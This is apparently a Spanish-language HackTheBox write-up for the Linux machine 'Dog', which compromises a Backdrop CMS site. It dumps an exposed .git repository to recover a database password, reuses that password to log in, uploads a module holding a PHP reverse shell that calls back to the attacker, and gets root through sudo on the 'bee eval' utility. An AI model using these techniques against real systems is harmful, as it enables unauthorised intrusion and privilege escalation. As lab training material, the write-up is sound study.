Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #backdrop #credential-reutilization #sudo 

![](assets/Pasted%20image%2020251221170137.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad.

- ttl 63 indica maquina linux

```bash
> ping -c 1 10.129.12.61
PING 10.129.12.61 (10.129.12.61) 56(84) bytes of data.
64 bytes from 10.129.12.61: icmp_seq=1 ttl=63 time=654 ms

--- 10.129.12.61 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 654.409/654.409/654.409/0.000 ms
```

Ahora realizo un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -Pn -n -vvv -sS --min-rate 5000 10.129.12.61
--------------------------------------------------------------
Scanned at 2025-12-21 17:02:48 CST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

- Puertos 22 y 80 abiertos

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,80 -sV -sC -sS -Pn -n -vvv 10.129.12.61 -oA nmap/target
----------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-git: 
|   10.129.12.61:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 80 HTTP: Apache httpd 2.4.41 podemos ver que corre un **Backdrop CMS**, podemos ver varias rutas del `robots.txt` y un repositorio`.git` expuesto
- Puerto 22 SSH: OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
## Enumeración

### **Puerto 80 HTTP**

Aqui corre `BackdropCMS` y la pagina es sobre perros obesitos.

![](assets/Pasted%20image%2020251221170806.png)

Tenemos pagina de Login:

![](assets/Pasted%20image%2020251221172353.png)


**Tecnologias Web.**

Wappalyzer nos confirma lo que ya sabíamos.

![](assets/Pasted%20image%2020251221170856.png)

**Repositorio .git**.

nmap nos indico que habia un repositorio `.git` expuesto y aquí lo confirmamos.

![](assets/Pasted%20image%2020251221171216.png)

Descargue el repositorio con la herramienta de `git-dumper`

```bash
> git-dumper http://10.129.12.61/ repo_dump
```

Lo primero que me encuentro es un archivo llamado `setting.php

- Encuentro las credenciales de `mysql` BackDropJ2024DS2024

```bash
> cat settings.php
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

**Enumeracion de Usuarios.**

Utilice la herramienta [BackDropScan](https://github.com/FisMatHack/BackDropScan) para enumerar posibles usuarios y enumerar la version. Alternativamente a esta herramienta existen muchas mas formas de enumerar usuarios ahora que tenemos el codigo fuente 

El funcionamiento es simple mandamos peticiones a:

```bash
?q=accounts/{username}
```

Y si el usuario existe, BackDrop nos regresa una pagina de Access Denied

![](assets/Pasted%20image%2020251221184449.png)

Si no existe nos regresa una pagina Not Found.

![](assets/Pasted%20image%2020251221184507.png)

```bash
python3 BackDropScan.py --url http://10.129.12.61/ --userslist /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --userenum
[+] Valid username: john
[+] Valid username: tiffany
[+] Valid username: John
[+] Valid username: morris
```

- Encontramos los usuarios john, tiffany, John y morris.

Para la version de BackDrop tenemos la 1.27.1.

```bash
> python3 BackDropScan.py --version --url http://10.129.12.76/
[+] Version: 1.27.1
```

## Explotación

Reutilice la credencial que habíamos encontrado en el repositorio para tratar de acceder a `Backdrop` con alguno de los usuarios encontrados. 

- Tuve acceso con tiffany:BackDropJ2024DS2024

![](assets/Pasted%20image%2020251221174047.png)

Dentro de `BackDrop` me aproveche de la función de Modulos que nos permite subir un modulo malicioso.

Para esto primero tenemos que crear un directorio con los siguiente 2 archivos:

- shell.info

```py
   type = module
    name = Block
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
```

- php-reverse-shell.php. Yo utilice la reverse-shell de [PentestMonkeyRevSh](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 

```bash
> cat php-reverse-shell.php

set_time_limit (0);
$VERSION = "1.0";
$ip = '<TUIP>';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Ahora zipeamos la carpeta.

```bash
> tar -cvf shell.tar shell/
```

Ahora nos vamos a la parte de **Functionalty -> Install Modules**

![](assets/Pasted%20image%2020251221174459.png)

Le daremos a **Manual Installation** y subiremos nuestro `.tar`

![](assets/Pasted%20image%2020251221174834.png)

Nos iremos a la ruta donde se instalo nuestro modulo

```
/modules/shell
```

![](assets/Pasted%20image%2020251221185704.png)

Nos ponemos en escucha:

```bash
> sudo nc -nlvp 4444
[sudo] password for wndr: 
Listening on 0.0.0.0 4444
```

Damos clic a nuestra rev-shell y recibimos la conexion.

```bash
Connection received on 10.129.12.76 49726
Linux dog 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 00:57:41 up 16 min,  0 users,  load average: 0.10, 0.07, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
## Escalada a usuario johncusack

Al mirar el `/etc/passwd` me encuentro con el siguiente usuario:

```bash
www-data@dog:/$ cat /etc/passwd
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

Trato de reutilizar la contraseña del repositorio `.git` y funciona correctamente.

- johncusack:BackDropJ2024DS2024

```bash
www-data@dog:/$ su johncusack
su johncusack
Password: BackDropJ2024DS2024
johncusack@dog:/$ id
id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
```

## Escalada a root

Enumere binarios con privilegios de SUDO y me encuentro con lo siguiente:

- binario `bee` puede ser ejecutado por root sin password.

```bash
johncusack@dog:/$ sudo -l
sudo -l
[sudo] password for johncusack: BackDropJ2024DS2024

Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

`Bee` es una utilidad CLI para `BackDropCMS` que permite variedad de cosas, entre ellas la ejecución de codigo `PHP` :

```bash
johncusack@dog:~$ /usr/local/bin/bee -h

ADVANCED
  db-query
   dbq
   Execute a query using db_query().

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.

  sql
   sqlc, sql-cli, db-cli
   Open an SQL command-line interface using Backdrop's database credentials.
```

Lo primero a tomar en cuenta es que debemos de estar en la ruta de instalación de `BackDrop` para utilizar `bee` por que si no pasa lo siguiente.

```bash
johncusack@dog:~$ sudo bee eval 'system("whoami")'

 ✘  The required bootstrap level for 'eval' is not ready. 
```

En este caso `BackDrop` esta instalado en `/var/www/html`.

- Ejecutamos el comando `whoami` y al parecer funciona correctamente.

```bash
johncusack@dog:/var/www/html$ sudo bee eval 'system("whoami")'
root
```

Por lo cual ahora podemos simplemente spawnear una shell.

```bash
johncusack@dog:/var/www/html$ sudo bee eval 'system("bash")'
root@dog:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@dog:/var/www/html# 
```

Obtenemos la flag en el directorio root

```bash
root@dog:~# ls
root.txt
root@dog:~# cat root.txt
4f4f1680c42
```

***PWNED***

![](assets/Pasted%20image%2020251221191157.png)